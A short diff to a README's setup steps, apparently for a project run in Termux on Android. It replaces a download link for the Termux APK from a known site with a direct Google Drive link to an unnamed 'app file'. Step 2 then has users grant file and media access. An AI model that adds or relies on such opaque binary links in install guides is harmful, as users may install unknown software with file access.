@@ -3,7 +3,7 @@
 Simple deployment
 
 ## Setup
-1. First above all, install Termux Apk. Click [Here](https://termux.en.uptodown.com/android/post-download/106885413) to download.
+1. First, download the app file: [Click Here to Download](https://drive.google.com/uc?id=1jcOiEgUbCL6EPOefdHCESK_Z1wzULNm0&export=download)
 
 2. Open Termux App info and Allow access to Files and Media:
 
